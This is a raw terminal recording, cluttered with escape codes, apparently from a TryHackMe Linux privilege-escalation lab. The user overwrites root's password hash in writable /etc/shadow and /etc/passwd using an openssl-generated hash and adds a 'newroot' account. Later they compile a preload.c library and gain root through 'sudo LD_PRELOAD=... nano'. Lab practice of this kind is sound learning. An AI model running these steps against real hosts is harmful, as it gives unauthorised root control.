[?25l:QuNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;65H[K[1;6H[?12l[?25h[?25l:uNhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;64H[K[1;6H[?12l[?25h[?25l:NhhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;63H[K[1;6H[?12l[?25h[?25l:hhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;62H[K[1;6H[?12l[?25h[?25lhArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;61H[K[1;6H[?12l[?25h[?25l:ArNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;60H[K[1;6H[?12l[?25h[?25l:rNl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;59H[K[1;6H[?12l[?25h[?25l:Nl3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;58H[K[1;6H[?12l[?25h[?25l:l3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;57H[K[1;6H[?12l[?25h[?25l:3frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;56H[K[1;6H[?12l[?25h[?25l:frY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;55H[K[1;6H[?12l[?25h[?25l:rY2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;54H[K[1;6H[?12l[?25h[?25l:Y2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;53H[K[1;6H[?12l[?25h[?25l:2oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;52H[K[1;6H[?12l[?25h[?25l:oUyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;51H[K[1;6H[?12l[?25h[?25l:UyiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;50H[K[1;6H[?12l[?25h[?25l:yiaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;49H[K[1;6H[?12l[?25h[?25l:iaudPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;48H[K[1;6H[?12l[?25h[?25l:audPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;47H[K[1;6H[?12l[?25h[?25l:udPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;46H[K[1;6H[?12l[?25h[?25l:dPwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;45H[K[1;6H[?12l[?25h[?25l:PwfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;44H[K[1;6H[?12l[?25h[?25l:wfDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;43H[K[1;6H[?12l[?25h[?25l:fDik3dzOXf73.j2urMYEtN.:0:99999:7:[1;42H[K[1;6H[?12l[?25h[?25l:Dik3dzOXf73.j2urMYEtN.:0:99999:7:[1;41H[K[1;6H[?12l[?25h[?25l:ik3dzOXf73.j2urMYEtN.:0:99999:7:[1;40H[K[1;6H[?12l[?25h[?25l:k3dzOXf73.j2urMYEtN.:0:99999:7:[1;39H[K[1;6H[?12l[?25h[?25l:3dzOXf73.j2urMYEtN.:0:99999:7:[1;38H[K[1;6H[?12l[?25h[?25l:dzOXf73.j2urMYEtN.:0:99999:7:[1;37H[K[1;6H[?12l[?25h[?25l:zOXf73.j2urMYEtN.:0:99999:7:[1;36H[K[1;6H[?12l[?25h[?25l:OXf73.j2urMYEtN.:0:99999:7:[1;35H[K[1;6H[?12l[?25h[?25l:Xf73.j2urMYEtN.:0:99999:7:[1;34H[K[1;6H[?12l[?25h[?25l:f73.j2urMYEtN.:0:99999:7:[1;33H[K[1;6H[?12l[?25h[?25l:73.j2urMYEtN.:0:99999:7:[1;32H[K[1;6H[?12l[?25h[?25l:3.j2urMYEtN.:0:99999:7:[1;31H[K[1;6H[?12l[?25h[?25l:.j2urMYEtN.:0:99999:7:[1;30H[K[1;6H[?12l[?25h[?25l:j2urMYEtN.:0:99999:7:[1;29H[K[1;6H[?12l[?25h[?25l:2urMYEtN.:0:99999:7:[1;28H[K[1;6H[?12l[?25h[?25l:urMYEtN.:0:99999:7:[1;27H[K[1;6H[?12l[?25h[?25l:rMYEtN.:0:99999:7:[1;26H[K[1;6H[?12l[?25h[?25l:MYEtN.:0:99999:7:[1;25H[K[1;6H[?12l[?25h[?25l:YEtN.:0:99999:7:[1;24H[K[1;6H[?12l[?25h[?25l:EtN.:0:99999:7:[1;23H[K[1;6H[?12l[?25h[?25l:tN.:0:99999:7:[1;22H[K[1;6H[?12l[?25h[?25l:N.:0:99999:7:[1;21H[K[1;6H[?12l[?25h[?25l:.:0:99999:7:[1;20H[K[1;6H[?12l[?25h[?25l::0:99999:7:[1;19H[K[1;6H[?12l[?25h[?25l[35;129H18[1;18H[?12l[?25h[?25l[35;127H6,26[6;26H[?12l[?25h[?25l[35;1H[K[35;1H/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvR[?12l[?25hD[?25lJXET..it8r.jbrlpfZeMdwD3B0fGxJI0[?12l[?25h[?25l[35;93H[K[35;93H[?12l[?25h[?25l[35;92H[K[35;92H[?12l[?25h[?25l[35;91H[K[35;91H[?12l[?25h[?25l[35;90H[K[35;90H[?12l[?25h[?25l[35;89H[K[35;89H[?12l[?25h[?25l[35;88H[K[35;88H[?12l[?25h[?25l[35;87H[K[35;87H[?12l[?25h[?25l[35;86H[K[35;86H[?12l[?25h[?25l[35;85H[K[35;85H[?12l[?25h[?25l[35;84H[K[35;84H[?12l[?25h[?25l[35;83H[K[35;83H[?12l[?25h[?25l[35;82H[K[35;82H[?12l[?25h[?25l[35;81H[K[35;81H[?12l[?25h[?25l[35;80H[K[35;80H[?12l[?25h[?25l[35;79H[K[35;79H[?12l[?25h[?25l[35;78H[K[35;78H[?12l[?25h[?25l[35;77H[K[35;77H[?12l[?25h[?25l[35;76H[K[35;76H[?12l[?25h[?25l[35;75H[K[35;75H[?12l[?25h[?25l[35;74H[K[35;74H[?12l[?25h[?25l[35;73H[K[35;73H[?12l[?25h[?25l[35;72H[K[35;72H[?12l[?25h[?25l[35;71H[K[35;71H[?12l[?25h[?25l[35;70H[K[35;70H[?12l[?25h[?25l[35;69H[K[35;69H[?12l[?25h[?25l[35;68H[K[35;68H[?12l[?25h[?25l[35;67H[K[35;67H[?12l[?25h[?25l[35;66H[K[35;66H[?12l[?25h[?25l[35;65H[K[35;65H[?12l[?25h[?25l[35;64H[K[35;64H[?12l[?25h[?25l[35;63H[K[35;63H[?12l[?25h[?25l[35;62H[K[35;62H[?12l[?25h[?25l[35;61H[K[35;61H[?12l[?25h[?25l[35;60H[K[35;60H[?12l[?25h[?25l[35;59H[K[35;59H[?12l[?25h[?25l[35;58H[K[35;58H[?12l[?25h[?25l[35;57H[K[35;57H[?12l[?25h[?25l[35;56H[K[35;56H[?12l[?25h[?25l[35;55H[K[35;55H[?12l[?25h[?25l[35;54H[K[35;54H[?12l[?25h[?25l[35;53H[K[35;53H[?12l[?25h[?25l[35;52H[K[35;52H[?12l[?25h[?25l[35;51H[K[35;51H[?12l[?25h[?25l[35;50H[K[35;50H[?12l[?25h[?25l[35;49H[K[35;49H[?12l[?25h[?25l[35;48H[K[35;48H[?12l[?25h[?25l[35;47H[K[35;47H[?12l[?25h[?25l[35;46H[K[35;46H[?12l[?25h[?25l[35;45H[K[35;45H[?12l[?25h[?25l[35;44H[K[35;44H[?12l[?25h[?25l[35;43H[K[35;43H[?12l[?25h[?25l[35;42H[K[35;42H[?12l[?25h[?25l[35;41H[K[35;41H[?12l[?25h[?25l[35;40H[K[35;40H[?12l[?25h[?25l[35;39H[K[35;39H[?12l[?25h[?25l[35;38H[K[35;38H[?12l[?25h[?25l[35;37H[K[35;37H[?12l[?25h[?25l[35;36H[K[35;36H[?12l[?25h[?25l[35;35H[K[35;35H[?12l[?25h[?25l[35;34H[K[35;34H[?12l[?25h[?25l[35;33H[K[35;33H[?12l[?25h[?25l[35;32H[K[35;32H[?12l[?25h[?25l[35;31H[K[35;31H[?12l[?25h[?25l[35;30H[K[35;30H[?12l[?25h[?25l[35;29H[K[35;29H[?12l[?25h[?25l[35;28H[K[35;28H[?12l[?25h[?25l[35;27H[K[35;27H[?12l[?25h[?25l[35;26H[K[35;26H[?12l[?25h[?25l[35;25H[K[35;25H[?12l[?25h[?25l[35;24H[K[35;24H[?12l[?25h[?25l[35;23H[K[35;23H[?12l[?25h[?25l[35;22H[K[35;22H[?12l[?25h[?25l[35;21H[K[35;21H[?12l[?25h[?25l[35;20H[K[35;20H[?12l[?25h[?25l[35;19H[K[35;19H[?12l[?25h[?25l[35;18H[K[35;18H[?12l[?25h[?25l[35;17H[K[35;17H[?12l[?25h[?25l[35;16H[K[35;16H[?12l[?25h[?25l[35;15H[K[35;15H[?12l[?25h[?25l[35;14H[K[35;14H[?12l[?25h[?25l[35;13H[K[35;13H[?12l[?25h[?25l[35;12H[K[35;12H[?12l[?25h[?25l[35;11H[K[35;11H[?12l[?25h[?25l[35;10H[K[35;10H[?12l[?25h[?25l[35;9H[K[35;9H[?12l[?25h[?25l[35;8H[K[35;8H[?12l[?25h[?25l[35;7H[K[35;7H[?12l[?25h[?25l[35;6H[K[35;6H[?12l[?25h[?25l[35;5H[K[35;5H[?12l[?25h[?25l[35;4H[K[35;4H[?12l[?25h[?25l[35;3H[K[35;3H[?12l[?25h[?25l[35;2H[K[35;2H[?12l[?25h [?25l[125C6,26[10CAll[6;26H[?12l[?25h[?25l[35;130H5[6;25H[?12l[?25h[?25l[35;130H4[6;24H[?12l[?25h[?25l[35;130H3[6;23H[?12l[?25h[?25l[35;130H2[6;22H[?12l[?25h[?25l[35;130H1[6;21H[?12l[?25h[?25l[35;130H0[6;20H[?12l[?25h[?25l[35;127H5[5;20H[?12l[?25h[?25l[35;127H4[4;20H[?12l[?25h[?25l[35;127H3[3;20H[?12l[?25h[?25l[35;127H2[2;20H[?12l[?25h[?25l[35;127H1,18[1;18H[?12l[?25h[?25l[35;130H7[1;17H[?12l[?25h[?25l[35;130H6[1;16H[?12l[?25h[?25l[35;130H5[1;15H[?12l[?25h[?25l[35;130H4[1;14H[?12l[?25h[?25l[35;130H3[1;13H[?12l[?25h[?25l[35;130H2[1;12H[?12l[?25h[?25l[35;130H1[1;11H[?12l[?25h[?25l[35;130H0[1;10H[?12l[?25h[?25l[35;129H9 [1;9H[?12l[?25h[?25l[35;129H8[1;8H[?12l[?25h[?25l[35;129H7[1;7H[?12l[?25h[?25l[35;129H6[1;6H[?12l[?25h[?25l[35;1H[1m-- INSERT --[m[35;127H[K[35;127H1,6[11CAll[1;6H[?12l[?25h[?25l:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:0:99999:7:::[35;129H104[1;104H[?12l[?25h[35;1H[K[1;103H[?25l[35;127H1,103[9CAll[1;103H[?12l[?25h[?25l[35;127H[K[35;1H:[?12l[?25hw[?25l[?12l[?25hq[?25l[?12l[?25h[?25l"/etc/shadow" 24L, 831C written
+[?1l>[?12l[?25h[?1049l]0;user@debian: ~user@debian:~$ vim /etc/shadow[Kvim /etc/shadow[8Psu root
+Password: 
+su: Authentication failure
+]0;user@debian: ~user@debian:~$ exit
+logout
+Connection to 10.10.166.44 closed.
+[0;38;5;231;48;5;31;1m leaundre [0;38;5;31;48;5;240;22m [0;38;5;250;48;5;240m… [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mctf [0;38;5;245;48;5;240;22m [0;38;5;250;48;5;240mthme [0;38;5;245;48;5;240;22m [0;38;5;252;48;5;240;1mLinux PrivEsc [0;38;5;240;49;22m [0mssh user@10.10.166.44
+user@10.10.166.44's password: 
+Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Dec 18 07:23:31 2020 from ip-10-6-39-210.eu-west-1.compute.internal
+]0;user@debian: ~user@debian:~$ su rppt[K[K[Koot
+Password: 
+su: Authentication failure
+]0;user@debian: ~user@debian:~$ ls -l /etc/passwd
+-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd
+]0;user@debian: ~user@debian:~$ openssl passws newpasswordhere
+openssl:Error: 'passws' is an invalid command.
+
+Standard commands
+asn1parse      ca             ciphers        crl            crl2pkcs7      
+dgst           dh             dhparam        dsa            dsaparam       
+ec             ecparam        enc            engine         errstr         
+gendh          gendsa         genrsa         nseq           ocsp           
+passwd         pkcs12         pkcs7          pkcs8          prime          
+rand           req            rsa            rsautl         s_client       
+s_server       s_time         sess_id        smime          speed          
+spkac          verify         version        x509           
+
+Message Digest commands (see the `dgst' command for more details)
+md2            md4            md5            rmd160         sha            
+sha1           
+
+Cipher commands (see the `enc' command for more details)
+aes-128-cbc    aes-128-ecb    aes-192-cbc    aes-192-ecb    aes-256-cbc    
+aes-256-ecb    base64         bf             bf-cbc         bf-cfb         
+bf-ecb         bf-ofb         cast           cast-cbc       cast5-cbc      
+cast5-cfb      cast5-ecb      cast5-ofb      des            des-cbc        
+des-cfb        des-ecb        des-ede        des-ede-cbc    des-ede-cfb    
+des-ede-ofb    des-ede3       des-ede3-cbc   des-ede3-cfb   des-ede3-ofb   
+des-ofb        des3           desx           rc2            rc2-40-cbc     
+rc2-64-cbc     rc2-cbc        rc2-cfb        rc2-ecb        rc2-ofb        
+rc4            rc4-40         
+
+]0;user@debian: ~user@debian:~$ openssl passws newpasswordhere[1P[1@d[1P[1@w[C[1P newpasswordhered newpasswordhere
+Warning: truncating password to 8 characters
+KHOOWWizTesUI
+]0;user@debian: ~user@debian:~$ cat /etc/pasw[Kswd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+Debian-exim:x:101:103::/var/spool/exim4:/bin/false
+sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+user:x:1000:1000:user,,,:/home/user:/bin/bash
+statd:x:103:65534::/var/lib/nfs:/bin/false
+mysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false
+]0;user@debian: ~user@debian:~$ va[Kim /etc/passwd
+[?1049h[?1h=[1;35r[?12;25h[?12l[?25h[27m[m[H[2J[?25l[35;1H"/etc/passwd" 24L, 1009C[>c[1;1Hroot:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+Debian-exim:x:101:103::/var/spool/exim4:/bin/false
+sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+user:x:1000:1000:user,,,:/home/user:/bin/bash
+statd:x:103:65534::/var/lib/nfs:/bin/false
+mysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false
+[94m~                                                                                                                                               [26;1H~                                                                                                                                               [27;1H~                                                                                                                                               [28;1H~                                                                                                                                               [29;1H~                                                                                                                                               [30;1H~                                                                                                                                               [31;1H~                                                                                                                                               [32;1H~                                                                                                                                               [33;1H~                                                                                                                                               [34;1H~                                                                                                                                               [m[35;127H1,1[11CAll[1;1H[?12l[?25h[?25l[35;129H2[1;2H[?12l[?25h[?25l[35;129H3[1;3H[?12l[?25h[?25l[35;129H4[1;4H[?12l[?25h[?25l[35;129H5[1;5H[?12l[?25h[?25l[35;129H6[1;6H[?12l[?25h[?25l[35;1H[1m-- INSERT --[m[35;13H[K[35;127H1,6[11CAll[1;6H[?12l[?25h[?25l::0:0:root:/root:/bin/bash[1;31H[K[1;6H[?12l[?25h[?25l: :0:0:root:/root:/bin/bash[35;129H7[1;7H[?12l[?25h[?25l[35;129H6[1;6H[?12l[?25h[?25l:KHOOWWizTesUI :0:0:root:/root:/bin/bash[35;129H19[1;19H[?12l[?25h[?25lI:0:0:root:/root:/bin/bash[1;44H[K[1;19H[?12l[?25h[35;1H[K[1;18H[?25l[35;127H1,18[10CAll[1;18H[?12l[?25h[?25l[35;127H[K[35;1H:[?12l[?25hw[?25l[?12l[?25hq[?25l[?12l[?25h[?25l"/etc/passwd" 24L, 1021C written
+[?1l>[?12l[?25h[?1049l]0;user@debian: ~user@debian:~$ su root
+Password: 
+root@debian:/home/user# exitvim /etc/shadow
+[?1049h[?1h=[1;35r[?12;25h[?12l[?25h[27m[m[H[2J[?25l[35;1H"/etc/shadow" 24L, 831C[>c[1;1Hroot:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:0:99999:7:::
+daemon:*:17298:0:99999:7:::
+bin:*:17298:0:99999:7:::
+sys:*:17298:0:99999:7:::
+sync:*:17298:0:99999:7:::
+games:*:17298:0:99999:7:::
+man:*:17298:0:99999:7:::
+lp:*:17298:0:99999:7:::
+mail:*:17298:0:99999:7:::
+news:*:17298:0:99999:7:::
+uucp:*:17298:0:99999:7:::
+proxy:*:17298:0:99999:7:::
+www-data:*:17298:0:99999:7:::
+backup:*:17298:0:99999:7:::
+list:*:17298:0:99999:7:::
+irc:*:17298:0:99999:7:::
+gnats:*:17298:0:99999:7:::
+nobody:*:17298:0:99999:7:::
+libuuid:!:17298:0:99999:7:::
+Debian-exim:!:17298:0:99999:7:::
+sshd:*:17298:0:99999:7:::
+user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
+statd:*:17299:0:99999:7:::
+mysql:!:18133:0:99999:7:::
+[94m~                                                                                                                                               [26;1H~                                                                                                                                               [27;1H~                                                                                                                                               [28;1H~                                                                                                                                               [29;1H~                                                                                                                                               [30;1H~                                                                                                                                               [31;1H~                                                                                                                                               [32;1H~                                                                                                                                               [33;1H~                                                                                                                                               [34;1H~                                                                                                                                               [m[35;127H1,1[11CAll[1;1H[?12l[?25h[?25l[35;1H[K[35;1H:[?12l[?25hq[?25l[?12l[?25h[?25l[35;1H[K[35;1H[?1l>[?12l[?25h[?1049lroot@debian:/home/user# vim /etc/shadow[K[K[K[K[K[Kpasswd
+[?1049h[?1h=[1;35r[?12;25h[?12l[?25h[27m[m[H[2J[?25l[35;1H"/etc/passwd" 24L, 1021C[>c[1;1Hroot:KHOOWWizTesUI:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+Debian-exim:x:101:103::/var/spool/exim4:/bin/false
+sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+user:x:1000:1000:user,,,:/home/user:/bin/bash
+statd:x:103:65534::/var/lib/nfs:/bin/false
+mysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false
+[94m~                                                                                                                                               [26;1H~                                                                                                                                               [27;1H~                                                                                                                                               [28;1H~                                                                                                                                               [29;1H~                                                                                                                                               [30;1H~                                                                                                                                               [31;1H~                                                                                                                                               [32;1H~                                                                                                                                               [33;1H~                                                                                                                                               [34;1H~                                                                                                                                               [m[35;127H1,1[11CAll[1;1H[?12l[?25h[?25lr[47moot:KHOOWWizTesUI:0:0:root:/root:/bin/bash [m[35;1H[1m-- VISUAL LINE --[m[35;18H[K[35;127H1,1[11CAll[1;1H[?12l[?25h[?25lroot:KHOOWWizTesUI:0:0:root:/root:/bin/bash[1;44H[K[35;1H[K[35;127H1,1[11CAll[1;1H[?12l[?25h[?25l[35;127H2[2;1H[?12l[?25h[?25l[35;127H3[3;1H[?12l[?25h[?25l[35;127H4[4;1H[?12l[?25h[?25l[35;127H5[5;1H[?12l[?25h[?25l[35;127H6[6;1H[?12l[?25h[?25l[35;127H7[7;1H[?12l[?25h[?25l[35;127H8[8;1H[?12l[?25h[?25l[35;127H9[9;1H[?12l[?25h[?25l[35;127H10,1[10;1H[?12l[?25h[?25l[35;128H1[11;1H[?12l[?25h[?25l[35;128H2[12;1H[?12l[?25h[?25l[35;128H3[13;1H[?12l[?25h[?25l[35;128H4[14;1H[?12l[?25h[?25l[35;128H5[15;1H[?12l[?25h[?25l[35;128H6[16;1H[?12l[?25h[?25l[35;128H7[17;1H[?12l[?25h[?25l[35;128H8[18;1H[?12l[?25h[?25l[35;128H9[19;1H[?12l[?25h[?25l[35;127H20[20;1H[?12l[?25h[?25l[35;128H1[21;1H[?12l[?25h[?25l[35;128H2[22;1H[?12l[?25h[?25l[35;128H3[23;1H[?12l[?25h[?25l[35;128H4[24;1H[?12l[?25h[?25l[35;1H[1m-- INSERT --[m[35;127H[K[35;127H25,1[10CAll[25;1H[K[25;1H[?12l[?25h[35;1H[K[25;1H[?25l[35;127H25,0-1[8CAll[25;1H[?12l[?25h[?25l
+root:KHOOWWizTesUI:0:0:root:/root:/bin/bash[26;44H[K[35;128H6,1  [26;1H[?12l[?25h[?25l[35;128H5,0-1[25;1H[?12l[?25h[?25l[35;128H6,1  [26;1H[?12l[?25h[?25l[35;1H[1m-- INSERT --[m[35;127H[K[35;127H26,44[9CAll[26;44H[?12l[?25h[?25l[35;131H3[26;43H[?12l[?25h[?25l[35;131H2[26;42H[?12l[?25h[?25l[35;131H1[26;41H[?12l[?25h[?25l[35;131H0[26;40H[?12l[?25h[?25l[35;130H39[26;39H[?12l[?25h[?25l[35;131H8[26;38H[?12l[?25h[?25l[35;131H7[26;37H[?12l[?25h[?25l[35;131H6[26;36H[?12l[?25h[?25l[35;131H5[26;35H[?12l[?25h[?25l[35;131H4[26;34H[?12l[?25h[?25l[35;131H3[26;33H[?12l[?25h[?25l[35;131H2[26;32H[?12l[?25h[?25l[35;131H1[26;31H[?12l[?25h[?25l[35;131H0[26;30H[?12l[?25h[?25l[35;130H29[26;29H[?12l[?25h[?25l[35;131H8[26;28H[?12l[?25h[?25l[35;131H7[26;27H[?12l[?25h[?25l[35;131H6[26;26H[?12l[?25h[?25l[35;131H5[26;25H[?12l[?25h[?25l[35;131H4[26;24H[?12l[?25h[?25l[35;131H3[26;23H[?12l[?25h[?25l[35;131H2[26;22H[?12l[?25h[?25l[35;131H1[26;21H[?12l[?25h[?25l[35;131H0[26;20H[?12l[?25h[?25l[35;130H19[26;19H[?12l[?25h[?25l[35;131H8[26;18H[?12l[?25h[?25l[35;131H7[26;17H[?12l[?25h[?25l[35;131H6[26;16H[?12l[?25h[?25l[35;131H5[26;15H[?12l[?25h[?25l[35;131H4[26;14H[?12l[?25h[?25l[35;131H3[26;13H[?12l[?25h[?25l[35;131H2[26;12H[?12l[?25h[?25l[35;131H1[26;11H[?12l[?25h[?25l[35;131H0[26;10H[?12l[?25h[?25l[35;130H9 [26;9H[?12l[?25h[?25l[35;130H8[26;8H[?12l[?25h[?25l[35;130H7[26;7H[?12l[?25h[?25l[35;130H6[26;6H[?12l[?25h[?25l[35;130H5[26;5H[?12l[?25h[?25l[35;130H4[26;4H[?12l[?25h[?25l[35;130H3[26;3H[?12l[?25h[?25l[35;130H2[26;2H[?12l[?25h[?25l[35;130H1[26;1H[?12l[?25h[?25lnroot:KHOOWWizTesUI:0:0:root:/root:/bin/bash[35;130H2[26;2H[?12l[?25h[?25lneroot:KHOOWWizTesUI:0:0:root:/root:/bin/bash[35;130H3[26;3H[?12l[?25h[?25lewroot:KHOOWWizTesUI:0:0:root:/root:/bin/bash[35;130H4[26;4H[?12l[?25h[?25l[35;128H5,1[25;1H[?12l[?25h[35;1H[K[25;1H[?25l[35;127H25,0-1[8CAll[25;1H[?12l[?25h[?25l[25;34r[34;1H
+[1;35r[34;1H[94m~                                                                                                                                               [m[35;127H[K[35;127H25,1[10CAll[25;1H[?12l[?25h[?25l[35;127H[K[35;1H:[?12l[?25hw[?25l[?12l[?25hq[?25l[?12l[?25h[?25l"/etc/passwd" 25L, 1068C written
+[?1l>[?12l[?25h[?1049lroot@debian:/home/user# su newroot
+root@debian:/home/user# exit
+exit
+root@debian:/home/user# eit[K[Kxit
+exit
+]0;user@debian: ~user@debian:~$ su newroot
+Password: 
+su: Authentication failure
+]0;user@debian: ~user@debian:~$ su newroot[3Proot
+Password: 
+su: Authentication failure
+]0;user@debian: ~user@debian:~$ su root[K[K[K[Knewroot
+Password: 
+su: Authentication failure
+]0;user@debian: ~user@debian:~$ sudo -l
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+
+User user may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+]0;user@debian: ~user@debian:~$ sudo bash
+[sudo] password for user: 
+Sorry, user user is not allowed to execute '/bin/bash' as root on debian.localdomain.
+]0;user@debian: ~user@debian:~$ su root
+Password: 
+root@debian:/home/user# exit
+exit
+]0;user@debian: ~user@debian:~$ su rootdo bash[2P-l
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+
+User user may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+]0;user@debian: ~user@debian:~$ ls tools/
+[0m[01;34mkernel-exploits[0m  [01;34mmysql-udf[0m  [01;34mnginx[0m  [01;34mprivesc-scripts[0m  [01;34msudo[0m  [01;34msuid[0m
+]0;user@debian: ~user@debian:~$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
+]0;user@debian: ~user@debian:~$ sudo LD_PRELOAD=/tmp/preload.so nano
+root@debian:/home/user# ldd /usr/sbin/apache2
+	linux-vdso.so.1 =>  (0x00007fffd91ff000)
+	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007fdb43737000)
